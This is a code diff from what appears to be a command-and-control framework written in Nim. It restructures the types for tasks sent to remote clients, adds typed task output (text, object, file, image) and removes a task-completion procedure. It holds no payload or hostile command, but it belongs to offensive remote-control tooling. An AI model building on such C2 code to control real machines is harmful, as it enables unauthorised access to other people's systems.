@@ -54,6 +54,22 @@ type TokenInformation* = ref object
   integrityLevel*: TokenIntegrityLevel
   groups*: seq[tuple[name, sid, domain: string]] 
 
+type 
+  TaskDataType* = enum
+    DataText = "text",
+    DataObject = "object",
+    DataFile = "file",
+    DataImage = "image"
+
+  TaskData* = ref object
+    name*: string
+    dataType*: TaskDataType
+    content*: string 
+
+  TaskOutput* = ref object
+    data*: seq[TaskData]
+    error*: string
+
 type
   C2Server* = ref object
     clients*: seq[C2Client]
@@ -105,16 +121,7 @@ type
     status*: TaskStatus
     arguments*: JsonNode
     future*: ref Future[void]
-    output*: JsonNode
-
-  RawTask* = ref object
-    clientHash*: string
-    clientId*: int
-    id*: int
-    action*: string
-    status*: TaskStatus
-    arguments*: JsonNode
-    output*: JsonNode
+    output*: TaskOutput
  
   Command* = ref object
     name*: string
@@ -259,14 +266,3 @@ proc `$`*(cc: CommandCategory): string =
   of CCTasks:
     "Tasks"
 
-proc mark_as_completed*(task: Task, response: JsonNode = %*{}) = 
-  task.output = response
-  if response == %*{}:
-    task.status = TaskCancelled
-  elif response["error"].getStr() == "":
-    task.status = TaskCompleted
-  else:
-    task.status = TaskCompletedWithError
-  if not task.future[].isNil():
-    task.future[].complete()
-    task.future[] = nil
